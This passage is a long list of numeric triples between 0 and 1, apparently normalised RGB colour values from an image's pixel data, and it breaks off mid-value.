{0.6,0.329,0.216},{0.62,0.376,0.282},{0.788,0.675,0.667},{0.82,0.71,0.714},{0.894,0.812,0.812},{0.902,0.812,0.82},{0.776,0.663,0.631},{0.776,0.663,0.631},{0.812,0.694,0.651},{0.804,0.69,0.643},{0.792,0.675,0.624},{0.804,0.678,0.608},{0.843,0.706,0.624},{0.855,0.714,0.62},{0.847,0.694,0.58},{0.82,0.651,0.518},{0.792,0.608,0.459},{0.788,0.588,0.439},{0.827,0.604,0.467},{0.894,0.647,0.529},{0.925,0.671,0.549},{0.925,0.663,0.537},{0.929,0.659,0.529},{0.941,0.663,0.537},{0.941,0.667,0.537},{0.945,0.671,0.537},{0.941,0.675,0.541},{0.937,0.667,0.529},{0.925,0.663,0.525},{0.914,0.659,0.514},{0.91,0.659,0.518},{0.91,0.659,0.518},{0.914,0.663,0.522},{0.91,0.659,0.518},{0.902,0.651,0.51},{0.89,0.635,0.494},{0.886,0.627,0.49},{0.886,0.627,0.49},{0.886,0.631,0.494},{0.875,0.62,0.486},{0.859,0.608,0.475},{0.78,0.522,0.376},{0.784,0.525,0.365},{0.788,0.533,0.384},{0.784,0.537,0.392},{0.784,0.545,0.404},{0.784,0.545,0.408},{0.784,0.545,0.412},{0.788,0.545,0.404},{0.776,0.533,0.4},{0.78,0.533,0.4},{0.784,0.537,0.4},{0.78,0.529,0.392},
{0.776,0.529,0.392},{0.749,0.502,0.365},{0.737,0.482,0.345},{0.725,0.475,0.333},{0.604,0.475,0.396},{0.176,0.208,0.224},{0.035,0.047,0.051},{0.243,0.439,0.482},{0.396,0.627,0.678},{0.478,0.341,0.29},{0.545,0.31,0.231},{0.604,0.357,0.286},{0.627,0.337,0.275},{0.635,0.325,0.267},{0.635,0.31,0.259},{0.69,0.376,0.318},{0.698,0.373,0.31},{0.608,0.247,0.188},{0.604,0.267,0.212},{0.62,0.259,0.216},{0.635,0.286,0.255},{0.659,0.31,0.275},{0.659,0.306,0.271},{0.643,0.282,0.251},{0.635,0.286,0.255},{0.627,0.29,0.251},{0.643,0.373,0.294},{0.6,0.357,0.294},{0.545,0.325,0.259},{0.463,0.231,0.169},{0.412,0.169,0.11},{0.412,0.161,0.098},{0.431,0.176,0.106},{0.455,0.2,0.125},{0.482,0.227,0.145},{0.51,0.255,0.165},{0.533,0.278,0.173},{0.553,0.29,0.188},{0.576,0.314,0.2},{0.588,0.322,0.204},{0.604,0.329,0.212},{0.62,0.353,0.227},{0.631,0.361,0.239},{0.627,0.349,0.227},{0.624,0.353,0.231},{0.624,0.349,0.231},{0.624,0.345,0.227},{0.624,0.349,0.231},{0.655,0.424,0.329},{0.792,0.678,0.675},{0.812,0.702,0.71},{0.835,0.729,0.737},{0.839,0.725,0.737},
{0.718,0.604,0.592},{0.718,0.604,0.592},{0.725,0.612,0.592},{0.749,0.635,0.608},{0.788,0.671,0.627},{0.804,0.682,0.627},{0.792,0.667,0.592},{0.8,0.667,0.573},{0.831,0.694,0.6},{0.863,0.722,0.631},{0.863,0.718,0.612},{0.839,0.675,0.549},{0.812,0.635,0.49},{0.804,0.616,0.459},{0.839,0.616,0.471},{0.882,0.639,0.502},{0.914,0.651,0.525},{0.922,0.647,0.522},{0.929,0.651,0.525},{0.933,0.655,0.525},{0.933,0.659,0.529},{0.929,0.659,0.525},{0.925,0.667,0.529},{0.922,0.667,0.529},{0.918,0.667,0.529},{0.922,0.671,0.533},{0.922,0.671,0.529},{0.922,0.671,0.529},{0.918,0.667,0.525},{0.91,0.659,0.518},{0.898,0.651,0.51},{0.894,0.643,0.502},{0.89,0.635,0.502},{0.867,0.62,0.482},{0.827,0.58,0.451},{0.757,0.506,0.361},{0.792,0.541,0.392},{0.796,0.553,0.408},{0.8,0.557,0.416},{0.8,0.553,0.42},{0.8,0.561,0.427},{0.804,0.565,0.431},{0.812,0.565,0.435},{0.812,0.573,0.439},{0.808,0.561,0.424},{0.808,0.569,0.427},{0.804,0.565,0.42},{0.796,0.553,0.412},{0.78,0.537,0.396},{0.773,0.529,0.388},{0.725,0.482,0.345},{0.314,0.173,0.118},{0.035,0.008,0.008},
{0.024,0.016,0.016},{0.008,0.012,0.012},{0.196,0.341,0.376},{0.51,0.357,0.31},{0.616,0.369,0.271},{0.639,0.38,0.286},{0.643,0.384,0.294},{0.635,0.365,0.278},{0.624,0.337,0.243},{0.612,0.325,0.239},{0.588,0.302,0.231},{0.592,0.31,0.243},{0.58,0.29,0.227},{0.592,0.29,0.239},{0.616,0.29,0.243},{0.616,0.286,0.243},{0.624,0.298,0.243},{0.624,0.306,0.255},{0.612,0.29,0.243},{0.6,0.314,0.255},{0.624,0.38,0.31},{0.561,0.361,0.294},{0.475,0.255,0.188},{0.439,0.196,0.129},{0.455,0.216,0.149},{0.478,0.235,0.161},{0.506,0.255,0.169},{0.533,0.282,0.184},{0.565,0.314,0.208},{0.584,0.329,0.22},{0.604,0.345,0.235},{0.612,0.349,0.231},{0.631,0.361,0.239},{0.635,0.373,0.251},{0.651,0.376,0.255},{0.663,0.392,0.267},{0.659,0.384,0.263},{0.663,0.392,0.271},{0.659,0.388,0.263},{0.655,0.384,0.263},{0.647,0.373,0.255},{0.651,0.376,0.255},{0.694,0.471,0.388},{0.796,0.682,0.678},{0.812,0.706,0.714},{0.82,0.725,0.725},{0.831,0.718,0.725},{0.706,0.588,0.58},{0.706,0.588,0.58},{0.714,0.596,0.588},{0.714,0.596,0.588},{0.718,0.604,0.592},{0.725,0.608,0.592},
{0.757,0.647,0.612},{0.788,0.671,0.624},{0.812,0.682,0.608},{0.827,0.694,0.608},{0.831,0.694,0.6},{0.839,0.702,0.6},{0.859,0.722,0.624},{0.875,0.729,0.624},{0.863,0.71,0.592},{0.847,0.678,0.541},{0.839,0.651,0.506},{0.839,0.631,0.482},{0.851,0.631,0.482},{0.855,0.627,0.478},{0.851,0.624,0.475},{0.859,0.635,0.49},{0.875,0.659,0.525},{0.878,0.667,0.537},{0.875,0.667,0.533},{0.863,0.647,0.51},{0.867,0.643,0.506},{0.871,0.655,0.518},{0.871,0.647,0.51},{0.843,0.612,0.475},{0.824,0.588,0.451},{0.8,0.561,0.427},{0.776,0.541,0.4},{0.741,0.506,0.361},{0.694,0.455,0.306},{0.741,0.494,0.353},{0.792,0.545,0.4},{0.808,0.573,0.424},{0.812,0.58,0.439},{0.82,0.584,0.443},{0.82,0.58,0.451},{0.82,0.588,0.451},{0.827,0.592,0.459},{0.831,0.6,0.467},{0.827,0.588,0.447},{0.831,0.596,0.455},{0.82,0.588,0.447},{0.82,0.584,0.439},{0.808,0.573,0.431},{0.765,0.529,0.396},{0.337,0.204,0.153},{0.035,0.008,0.008},{0.016,0.008,0.012},{0.012,0.008,0.012},{0.02,0.008,0.012},{0.004,0.004,0.004},{0.427,0.243,0.18},{0.624,0.369,0.263},{0.639,0.373,0.267},
{0.651,0.38,0.278},{0.667,0.4,0.294},{0.678,0.42,0.318},{0.71,0.459,0.357},{0.714,0.455,0.353},{0.722,0.471,0.361},{0.702,0.443,0.333},{0.647,0.376,0.278},{0.616,0.329,0.247},{0.635,0.345,0.267},{0.639,0.345,0.278},{0.616,0.325,0.251},{0.608,0.302,0.239},{0.624,0.349,0.271},{0.616,0.404,0.341},{0.514,0.302,0.235},{0.482,0.255,0.18},{0.498,0.255,0.176},{0.525,0.275,0.188},{0.549,0.294,0.192},{0.576,0.329,0.22},{0.616,0.365,0.259},{0.631,0.376,0.259},{0.643,0.384,0.267},{0.659,0.404,0.282},{0.667,0.404,0.282},{0.671,0.408,0.282},{0.686,0.416,0.294},{0.69,0.424,0.302},{0.694,0.424,0.298},{0.698,0.427,0.298},{0.694,0.416,0.29},{0.682,0.408,0.282},{0.678,0.404,0.278},{0.675,0.396,0.278},{0.675,0.4,0.278},{0.722,0.514,0.439},{0.796,0.678,0.678},{0.808,0.702,0.71},{0.827,0.725,0.733},{0.839,0.725,0.737},{0.702,0.584,0.576},{0.702,0.584,0.576},{0.702,0.584,0.573},{0.706,0.588,0.576},{0.71,0.592,0.584},{0.714,0.6,0.588},{0.722,0.604,0.592},{0.714,0.6,0.584},{0.718,0.6,0.58},{0.741,0.624,0.58},{0.784,0.663,0.6},{0.824,0.69,0.608},
{0.835,0.702,0.612},{0.839,0.706,0.62},{0.867,0.729,0.643},{0.886,0.753,0.659},{0.902,0.765,0.663},{0.902,0.761,0.647},{0.902,0.753,0.643},{0.902,0.745,0.627},{0.898,0.737,0.612},{0.894,0.733,0.604},{0.89,0.725,0.592},{0.89,0.729,0.596},{0.898,0.729,0.6},{0.894,0.733,0.604},{0.89,0.729,0.6},{0.882,0.714,0.584},{0.859,0.694,0.573},{0.816,0.639,0.506},{0.776,0.588,0.447},{0.741,0.537,0.388},{0.722,0.494,0.333},{0.722,0.486,0.322},{0.725,0.498,0.341},{0.749,0.506,0.373},{0.804,0.561,0.416},{0.816,0.58,0.443},{0.824,0.592,0.455},{0.831,0.596,0.459},{0.843,0.612,0.475},{0.847,0.616,0.478},{0.851,0.62,0.486},{0.851,0.62,0.486},{0.851,0.616,0.478},{0.847,0.612,0.471},{0.843,0.608,0.467},{0.843,0.608,0.467},{0.78,0.553,0.42},{0.302,0.18,0.141},{0.059,0.012,0.02},{0.11,0.067,0.086},{0.02,0.004,0.004},{0.039,0.024,0.027},{0.016,0.012,0.016},{0.016,0.008,0.008},{0.255,0.137,0.106},{0.58,0.325,0.239},{0.631,0.369,0.271},{0.663,0.388,0.278},{0.671,0.392,0.294},{0.678,0.412,0.306},{0.694,0.427,0.325},{0.706,0.439,0.341},{0.682,0.424,0.325},
{0.694,0.439,0.337},{0.706,0.451,0.349},{0.675,0.408,0.302},{0.671,0.396,0.298},{0.663,0.4,0.29},{0.647,0.373,0.259},{0.651,0.361,0.267},{0.62,0.365,0.282},{0.557,0.353,0.286},{0.529,0.31,0.231},{0.545,0.306,0.216},{0.573,0.325,0.216},{0.596,0.341,0.224},{0.627,0.373,0.255},{0.647,0.388,0.271},{0.667,0.412,0.29},{0.678,0.424,0.298},{0.69,0.431,0.298},{0.694,0.431,0.302},{0.706,0.447,0.325},{0.71,0.447,0.314},{0.722,0.459,0.325},{0.718,0.455,0.322},{0.718,0.455,0.325},{0.718,0.455,0.329},{0.718,0.447,0.322},{0.722,0.455,0.325},{0.714,0.451,0.322},{0.706,0.439,0.314},{0.694,0.424,0.302},{0.741,0.545,0.475},{0.796,0.682,0.682},{0.808,0.702,0.706},{0.831,0.733,0.733},{0.847,0.737,0.741},{0.71,0.592,0.588},{0.71,0.592,0.588},{0.706,0.592,0.58},{0.698,0.58,0.573},{0.69,0.569,0.561},{0.714,0.596,0.584},{0.718,0.6,0.592},{0.714,0.596,0.584},{0.706,0.592,0.576},{0.71,0.592,0.576},{0.722,0.608,0.588},{0.725,0.604,0.573},{0.753,0.627,0.569},{0.784,0.655,0.576},{0.788,0.663,0.584},{0.792,0.667,0.584},{0.831,0.698,0.608},{0.863,0.729,0.631},
{0.886,0.753,0.651},{0.902,0.769,0.663},{0.898,0.753,0.639},{0.882,0.722,0.596},{0.863,0.69,0.557},{0.839,0.663,0.518},{0.804,0.627,0.471},{0.8,0.616,0.455},{0.8,0.616,0.455},{0.804,0.616,0.459},{0.82,0.635,0.482},{0.831,0.651,0.502},{0.847,0.667,0.529},{0.863,0.694,0.557},{0.886,0.725,0.6},{0.898,0.745,0.627},{0.878,0.725,0.612},{0.757,0.529,0.4},{0.812,0.576,0.439},{0.827,0.592,0.455},{0.839,0.608,0.467},{0.855,0.624,0.49},{0.859,0.624,0.486},{0.867,0.635,0.51},{0.871,0.643,0.514},{0.871,0.639,0.502},{0.871,0.639,0.51},{0.871,0.631,0.498},{0.863,0.635,0.498},{0.835,0.612,0.478},{0.412,0.29,0.267},{0.129,0.071,0.09},{0.086,0.039,0.055},{0.067,0.024,0.035},{0.086,0.051,0.063},{0.012,0.004,0.008},{0.02,0.012,0.016},{0.012,0.008,0.008},{0.067,0.035,0.031},{0.553,0.322,0.239},{0.588,0.329,0.247},{0.616,0.349,0.259},{0.627,0.357,0.263},{0.643,0.376,0.282},{0.627,0.353,0.263},{0.608,0.333,0.239},{0.608,0.329,0.231},{0.624,0.349,0.247},{0.655,0.384,0.271},{0.678,0.408,0.294},{0.682,0.412,0.294},{0.686,0.404,0.282},{0.678,0.392,0.271},
{0.635,0.361,0.267},{0.569,0.341,0.263},{0.565,0.349,0.271},{0.58,0.345,0.247},{0.592,0.345,0.231},{0.627,0.376,0.259},{0.663,0.408,0.282},{0.682,0.427,0.302},{0.694,0.439,0.31},{0.71,0.447,0.318},{0.729,0.475,0.349},{0.737,0.482,0.353},{0.737,0.478,0.345},{0.741,0.486,0.357},{0.745,0.49,0.357},{0.749,0.494,0.361},{0.749,0.486,0.353},{0.745,0.478,0.349},{0.741,0.482,0.357},{0.745,0.478,0.353},{0.737,0.471,0.345},{0.737,0.478,0.349},{0.729,0.467,0.341},{0.729,0.463,0.341},{0.765,0.576,0.518},{0.8,0.686,0.686},{0.808,0.702,0.71},{0.839,0.741,0.741},{0.863,0.753,0.761},{0.718,0.604,0.604},{0.718,0.604,0.604},{0.686,0.569,0.561},{0.667,0.545,0.537},{0.663,0.541,0.533},{0.694,0.58,0.569},{0.706,0.588,0.576},{0.694,0.58,0.569},{0.69,0.573,0.561},{0.686,0.565,0.553},{0.702,0.584,0.569},{0.718,0.6,0.584},{0.71,0.592,0.573},{0.718,0.6,0.573},{0.749,0.631,0.592},{0.78,0.663,0.608},{0.8,0.678,0.608},{0.808,0.682,0.6},{0.824,0.694,0.616},{0.847,0.718,0.631},{0.882,0.745,0.651},{0.902,0.757,0.647},{0.902,0.749,0.62},{0.902,0.737,0.608},
{0.902,0.741,0.616},{0.906,0.749,0.627},{0.894,0.745,0.624},{0.886,0.737,0.62},{0.851,0.694,0.573},{0.816,0.643,0.514},{0.788,0.612,0.467},{0.769,0.58,0.427},{0.765,0.569,0.408},{0.769,0.569,0.412},{0.757,0.557,0.404},{0.749,0.525,0.396},{0.816,0.596,0.463},{0.835,0.608,0.478},{0.851,0.624,0.49},{0.859,0.643,0.51},{0.867,0.643,0.514},{0.875,0.659,0.525},{0.882,0.655,0.525},{0.882,0.651,0.525},{0.886,0.663,0.537},{0.89,0.663,0.537},{0.878,0.663,0.533},{0.678,0.49,0.416},{0.133,0.075,0.098},{0.169,0.114,0.149},{0.082,0.031,0.047},{0.122,0.063,0.09},{0.098,0.047,0.071},{0.09,0.047,0.059},{0.024,0.012,0.016},{0.031,0.016,0.02},{0.059,0.043,0.047},{0.443,0.255,0.188},{0.565,0.314,0.224},{0.569,0.298,0.22},{0.569,0.302,0.227},{0.58,0.31,0.231},{0.592,0.314,0.224},{0.588,0.31,0.235},{0.6,0.314,0.22},{0.608,0.322,0.224},{0.631,0.341,0.239},{0.667,0.38,0.267},{0.69,0.404,0.286},{0.69,0.404,0.282},{0.647,0.369,0.259},{0.506,0.247,0.173},{0.439,0.231,0.169},{0.612,0.384,0.282},{0.639,0.392,0.278},{0.655,0.404,0.282},{0.682,0.427,0.302},
{0.71,0.455,0.325},{0.722,0.471,0.341},{0.737,0.486,0.357},{0.749,0.498,0.361},{0.761,0.51,0.376},{0.769,0.514,0.38},{0.773,0.522,0.384},{0.776,0.522,0.388},{0.784,0.533,0.4},{0.776,0.522,0.384},{0.773,0.514,0.38},{0.769,0.514,0.38},{0.773,0.514,0.384},{0.773,0.514,0.388},{0.765,0.502,0.38},{0.757,0.494,0.376},{0.749,0.49,0.369},{0.753,0.494,0.369},{0.78,0.604,0.553},{0.8,0.686,0.69},{0.808,0.702,0.71},{0.839,0.741,0.745},{0.867,0.769,0.776},{0.733,0.62,0.627},{0.733,0.62,0.627},{0.678,0.561,0.557},{0.659,0.537,0.529},{0.663,0.541,0.533},{0.686,0.569,0.561},{0.69,0.573,0.561},{0.678,0.561,0.549},{0.667,0.545,0.533},{0.667,0.541,0.529},{0.694,0.576,0.565},{0.694,0.573,0.561},{0.706,0.588,0.573},{0.702,0.584,0.569},{0.71,0.596,0.58},{0.71,0.596,0.576},{0.729,0.612,0.588},{0.753,0.635,0.592},{0.796,0.678,0.624},{0.816,0.698,0.643},{0.827,0.702,0.639},{0.843,0.718,0.651},{0.871,0.749,0.667},{0.906,0.78,0.686},{0.929,0.796,0.69},{0.937,0.796,0.682},{0.929,0.784,0.667},{0.918,0.773,0.643},{0.91,0.753,0.624},{0.886,0.722,0.588},
{0.859,0.686,0.537},{0.843,0.663,0.51},{0.824,0.643,0.486},{0.816,0.631,0.478},{0.792,0.62,0.482},{0.749,0.529,0.412},{0.816,0.604,0.475},{0.843,0.62,0.486},{0.855,0.639,0.51},{0.867,0.651,0.525},{0.882,0.671,0.541},{0.894,0.686,0.557},{0.898,0.69,0.565},{0.906,0.69,0.569},{0.906,0.694,0.573},{0.898,0.678,0.553},{0.902,0.686,0.565},{0.635,0.471,0.412},{0.263,0.2,0.247},{0.137,0.086,0.118},{0.275,0.239,0.29},{0.255,0.239,0.275},{0.263,0.255,0.286},{0.271,0.263,0.282},{0.275,0.271,0.294},{0.188,0.18,0.192},{0.102,0.094,0.098},{0.275,0.165,0.133},{0.573,0.329,0.227},{0.565,0.314,0.216},{0.553,0.298,0.216},{0.565,0.306,0.212},{0.573,0.31,0.216},{0.561,0.302,0.216},{0.592,0.322,0.227},{0.612,0.345,0.239},{0.627,0.353,0.247},{0.643,0.349,0.239},{0.655,0.376,0.255},{0.631,0.361,0.251},{0.545,0.318,0.247},{0.427,0.224,0.169},{0.553,0.337,0.255},{0.659,0.416,0.294},{0.682,0.427,0.306},{0.706,0.455,0.329},{0.725,0.471,0.345},{0.753,0.498,0.369},{0.757,0.502,0.369},{0.78,0.529,0.396},{0.784,0.529,0.396},{0.796,0.549,0.416},{0.804,0.553,0.424},
{0.804,0.553,0.424},{0.804,0.553,0.416},{0.8,0.545,0.412},{0.804,0.549,0.416},{0.804,0.549,0.42},{0.804,0.553,0.424},{0.8,0.541,0.412},{0.8,0.541,0.416},{0.792,0.529,0.4},{0.792,0.533,0.408},{0.784,0.529,0.408},{0.776,0.522,0.396},{0.792,0.624,0.573},{0.8,0.686,0.686},{0.812,0.702,0.71},{0.835,0.741,0.745},{0.871,0.769,0.78},{0.737,0.635,0.639},{0.737,0.635,0.639},{0.702,0.584,0.588},{0.647,0.529,0.522},{0.651,0.525,0.522},{0.675,0.553,0.549},{0.69,0.573,0.569},{0.682,0.561,0.553},{0.647,0.525,0.518},{0.655,0.525,0.518},{0.678,0.557,0.549},{0.671,0.549,0.537},{0.678,0.561,0.545},{0.694,0.573,0.561},{0.706,0.588,0.576},{0.714,0.596,0.58},{0.718,0.596,0.584},{0.718,0.596,0.576},{0.733,0.616,0.596},{0.737,0.624,0.596},{0.753,0.635,0.604},{0.773,0.655,0.616},{0.796,0.678,0.631},{0.808,0.69,0.631},{0.824,0.702,0.639},{0.847,0.722,0.651},{0.867,0.741,0.663},{0.878,0.749,0.667},{0.875,0.737,0.651},{0.863,0.725,0.639},{0.847,0.71,0.616},{0.843,0.702,0.612},{0.82,0.682,0.6},{0.804,0.671,0.608},{0.78,0.643,0.584},{0.725,0.506,0.404},
{0.808,0.592,0.471},{0.843,0.627,0.506},{0.863,0.651,0.518},{0.886,0.675,0.545},{0.898,0.686,0.561},{0.906,0.698,0.576},{0.91,0.702,0.58},{0.918,0.71,0.592},{0.91,0.702,0.58},{0.914,0.702,0.58},{0.906,0.698,0.576},{0.855,0.663,0.565},{0.482,0.486,0.518},{0.459,0.49,0.533},{0.4,0.412,0.451},{0.31,0.306,0.341},{0.298,0.275,0.314},{0.122,0.09,0.114},{0.047,0.031,0.035},{0.039,0.027,0.035},{0.004,0,0.004},{0.016,0.008,0.008},{0.412,0.231,0.165},{0.522,0.286,0.2},{0.51,0.278,0.192},{0.502,0.267,0.184},{0.498,0.263,0.184},{0.506,0.275,0.192},{0.51,0.267,0.184},{0.518,0.267,0.184},{0.529,0.278,0.184},{0.537,0.278,0.184},{0.533,0.282,0.184},{0.573,0.341,0.278},{0.753,0.651,0.631},{0.682,0.525,0.478},{0.675,0.431,0.318},{0.718,0.467,0.345},{0.741,0.486,0.365},{0.757,0.502,0.376},{0.776,0.525,0.392},{0.792,0.537,0.412},{0.8,0.549,0.42},{0.812,0.561,0.435},{0.82,0.569,0.439},{0.824,0.576,0.447},{0.831,0.584,0.455},{0.835,0.588,0.455},{0.835,0.584,0.451},{0.831,0.584,0.447},{0.835,0.584,0.455},{0.831,0.58,0.447},{0.831,0.584,0.451},
{0.824,0.576,0.447},{0.82,0.569,0.435},{0.812,0.557,0.424},{0.804,0.549,0.427},{0.796,0.541,0.42},{0.792,0.533,0.404},{0.808,0.647,0.6},{0.796,0.682,0.682},{0.816,0.706,0.714},{0.831,0.729,0.737},{0.863,0.761,0.769},{0.729,0.624,0.627},{0.729,0.624,0.627},{0.729,0.616,0.624},{0.678,0.561,0.553},{0.667,0.545,0.541},{0.682,0.561,0.561},{0.69,0.573,0.573},{0.678,0.557,0.549},{0.647,0.518,0.514},{0.651,0.529,0.518},{0.671,0.549,0.541},{0.667,0.545,0.533},{0.663,0.541,0.529},{0.663,0.537,0.525},{0.675,0.553,0.541},{0.694,0.573,0.565},{0.702,0.584,0.573},{0.706,0.588,0.573},{0.702,0.584,0.569},{0.706,0.588,0.576},{0.702,0.584,0.569},{0.725,0.608,0.596},{0.733,0.62,0.6},{0.745,0.627,0.608},{0.745,0.631,0.608},{0.741,0.624,0.596},{0.749,0.627,0.604},{0.765,0.647,0.616},{0.773,0.655,0.624},{0.773,0.651,0.62},{0.761,0.639,0.6},{0.757,0.631,0.592},{0.753,0.631,0.596},{0.765,0.643,0.616},{0.773,0.655,0.627},{0.733,0.522,0.439},{0.784,0.553,0.431},{0.843,0.631,0.506},{0.867,0.655,0.529},{0.89,0.678,0.553},{0.906,0.698,0.576},{0.918,0.706,0.584},
{0.922,0.714,0.592},{0.925,0.718,0.604},{0.922,0.71,0.592},{0.925,0.718,0.596},{0.914,0.702,0.584},{0.878,0.667,0.553},{0.282,0.2,0.216},{0.2,0.137,0.18},{0.114,0.059,0.086},{0.137,0.078,0.11},{0.082,0.035,0.055},{0.078,0.035,0.051},{0.043,0.024,0.031},{0.008,0.004,0.004},{0.004,0,0.004},{0.016,0.008,0.008},{0.067,0.031,0.024},{0.357,0.169,0.102},{0.365,0.165,0.094},{0.337,0.145,0.082},{0.322,0.133,0.075},{0.314,0.122,0.067},{0.298,0.114,0.059},{0.294,0.098,0.051},{0.306,0.098,0.055},{0.294,0.09,0.047},{0.545,0.349,0.31},{0.737,0.537,0.498},{0.792,0.624,0.588},{0.686,0.459,0.361},{0.729,0.482,0.361},{0.765,0.506,0.388},{0.796,0.549,0.42},{0.804,0.549,0.42},{0.816,0.561,0.427},{0.827,0.576,0.447},{0.839,0.588,0.459},{0.843,0.6,0.467},{0.851,0.604,0.478},{0.855,0.612,0.482},{0.855,0.616,0.486},{0.855,0.612,0.486},{0.855,0.616,0.482},{0.859,0.62,0.486},{0.859,0.624,0.494},{0.859,0.62,0.482},{0.851,0.612,0.478},{0.847,0.596,0.467},{0.847,0.596,0.463},{0.835,0.584,0.455},{0.827,0.573,0.451},{0.816,0.561,0.435},{0.816,0.561,0.439},
{0.816,0.655,0.612},{0.796,0.678,0.678},{0.816,0.702,0.71},{0.827,0.722,0.729},{0.863,0.749,0.761},{0.737,0.639,0.647},{0.737,0.639,0.647},{0.737,0.639,0.643},{0.729,0.624,0.631},{0.71,0.592,0.596},{0.706,0.592,0.592},{0.702,0.584,0.584},{0.659,0.537,0.525},{0.635,0.506,0.498},{0.655,0.529,0.522},{0.671,0.549,0.537},{0.663,0.541,0.533},{0.671,0.549,0.537},{0.667,0.537,0.529},{0.667,0.533,0.525},{0.678,0.553,0.545},{0.698,0.576,0.569},{0.698,0.58,0.573},{0.702,0.58,0.569},{0.722,0.604,0.596},{0.71,0.592,0.584},{0.702,0.58,0.569},{0.706,0.58,0.569},{0.71,0.588,0.576},{0.698,0.573,0.561},{0.698,0.573,0.561},{0.706,0.58,0.569},{0.714,0.592,0.58},{0.725,0.612,0.596},{0.725,0.612,0.6},{0.729,0.612,0.596},{0.729,0.612,0.6},{0.729,0.616,0.6},{0.737,0.624,0.608},{0.749,0.631,0.62},{0.729,0.545,0.494},{0.773,0.514,0.388},{0.835,0.612,0.486},{0.867,0.651,0.529},{0.89,0.671,0.553},{0.914,0.702,0.58},{0.925,0.714,0.596},{0.929,0.722,0.6},{0.933,0.718,0.612},{0.933,0.725,0.604},{0.929,0.718,0.6},{0.925,0.71,0.592},{0.91,0.694,0.576},
{0.478,0.345,0.322},{0.149,0.086,0.122},{0.137,0.086,0.114},{0.075,0.027,0.047},{0.047,0.012,0.02},{0.047,0.02,0.027},{0.02,0.008,0.012},{0.02,0.008,0.012},{0,0,0},{0,0,0},{0,0,0},{0.208,0.082,0.043},{0.235,0.075,0.031},{0.22,0.063,0.02},{0.216,0.059,0.02},{0.208,0.055,0.016},{0.2,0.043,0.012},{0.196,0.031,0.012},{0.227,0.051,0.027},{0.408,0.208,0.173},{0.718,0.541,0.529},{0.8,0.569,0.533},{0.718,0.455,0.388},{0.737,0.498,0.376},{0.78,0.533,0.408},{0.808,0.565,0.443},{0.824,0.576,0.451},{0.843,0.592,0.463},{0.851,0.608,0.475},{0.859,0.62,0.494},{0.871,0.631,0.51},{0.867,0.627,0.51},{0.867,0.624,0.506},{0.871,0.624,0.502},{0.871,0.639,0.514},{0.871,0.635,0.506},{0.871,0.635,0.506},{0.871,0.631,0.498},{0.871,0.627,0.49},{0.875,0.635,0.51},{0.867,0.624,0.486},{0.863,0.612,0.471},{0.859,0.608,0.475},{0.855,0.608,0.475},{0.843,0.592,0.467},{0.835,0.573,0.443},{0.824,0.569,0.447},{0.827,0.671,0.624},{0.796,0.682,0.69},{0.812,0.706,0.714},{0.827,0.725,0.733},{0.867,0.753,0.761},{0.733,0.635,0.643},
{0.733,0.635,0.643},{0.741,0.651,0.647},{0.745,0.647,0.651},{0.745,0.643,0.647},{0.718,0.608,0.612},{0.682,0.565,0.561},{0.655,0.529,0.525},{0.643,0.518,0.514},{0.651,0.525,0.518},{0.667,0.545,0.537},{0.667,0.541,0.533},{0.69,0.569,0.561},{0.682,0.561,0.553},{0.667,0.537,0.529},{0.675,0.549,0.537},{0.71,0.592,0.58},{0.702,0.584,0.573},{0.702,0.584,0.573},{0.71,0.592,0.584},{0.702,0.58,0.569},{0.686,0.561,0.549},{0.686,0.553,0.545},{0.694,0.573,0.561},{0.698,0.576,0.565},{0.694,0.569,0.561},{0.706,0.576,0.569},{0.714,0.596,0.58},{0.733,0.616,0.608},{0.729,0.616,0.6},{0.729,0.612,0.6},{0.725,0.612,0.6},{0.729,0.62,0.604},{0.722,0.604,0.592},{0.733,0.62,0.604},{0.714,0.498,0.451},{0.757,0.471,0.357},{0.816,0.553,0.431},{0.863,0.639,0.522},{0.886,0.671,0.553},{0.906,0.69,0.569},{0.918,0.698,0.58},{0.929,0.722,0.604},{0.941,0.733,0.627},{0.941,0.733,0.616},{0.929,0.718,0.6},{0.925,0.71,0.596},{0.91,0.694,0.576},{0.784,0.58,0.486},{0.227,0.153,0.173},{0.122,0.067,0.094},{0.055,0.016,0.027},{0.059,0.027,0.039},{0.035,0.02,0.027},
{0.008,0.004,0.008},{0,0,0},{0,0,0},{0,0,0},{0.016,0.004,0.008},{0.247,0.094,0.047},{0.22,0.071,0.024},{0.216,0.067,0.024},{0.216,0.059,0.016},{0.2,0.051,0.016},{0.251,0.078,0.043},{0.376,0.157,0.102},{0.522,0.259,0.184},{0.624,0.345,0.278},{0.753,0.478,0.435},{0.816,0.573,0.533},{0.722,0.486,0.384},{0.78,0.533,0.412},{0.812,0.58,0.447},{0.843,0.604,0.475},{0.855,0.612,0.478},{0.867,0.616,0.494},{0.875,0.631,0.51},{0.886,0.647,0.533},{0.886,0.651,0.537},{0.89,0.655,0.537},{0.886,0.659,0.537},{0.89,0.651,0.533},{0.886,0.655,0.529},{0.89,0.655,0.529},{0.894,0.655,0.529},{0.886,0.651,0.522},{0.886,0.643,0.518},{0.886,0.651,0.518},{0.886,0.643,0.514},{0.882,0.635,0.502},{0.875,0.627,0.502},{0.867,0.62,0.49},{0.859,0.612,0.482},{0.847,0.596,0.467},{0.835,0.584,0.451},{0.839,0.675,0.62},{0.804,0.69,0.698},{0.812,0.71,0.714},{0.824,0.725,0.725},{0.863,0.765,0.769},{0.694,0.576,0.58},{0.694,0.576,0.58},{0.725,0.627,0.631},{0.741,0.643,0.647},{0.749,0.647,0.659},{0.729,0.62,0.627},{0.671,0.549,0.557},
{0.647,0.525,0.518},{0.647,0.525,0.522},{0.663,0.541,0.533},{0.663,0.541,0.533},{0.667,0.541,0.533},{0.671,0.545,0.541},{0.667,0.541,0.533},{0.663,0.537,0.525},{0.659,0.525,0.518},{0.69,0.569,0.557},{0.706,0.584,0.576},{0.698,0.58,0.573},{0.694,0.573,0.565},{0.678,0.557,0.545},{0.686,0.561,0.553},{0.678,0.549,0.541},{0.69,0.561,0.553},{0.698,0.576,0.565},{0.698,0.573,0.565},{0.71,0.588,0.576},{0.725,0.608,0.6},{0.741,0.624,0.616},{0.725,0.612,0.6},{0.729,0.612,0.604},{0.737,0.62,0.612},{0.737,0.62,0.612},{0.718,0.596,0.588},{0.714,0.592,0.58},{0.725,0.573,0.549},{0.749,0.482,0.404},{0.788,0.506,0.388},{0.851,0.612,0.49},{0.878,0.667,0.541},{0.902,0.686,0.569},{0.918,0.71,0.588},{0.925,0.714,0.596},{0.933,0.725,0.608},{0.929,0.718,0.596},{0.925,0.714,0.592},{0.922,0.71,0.588},{0.91,0.694,0.573},{0.886,0.671,0.545},{0.51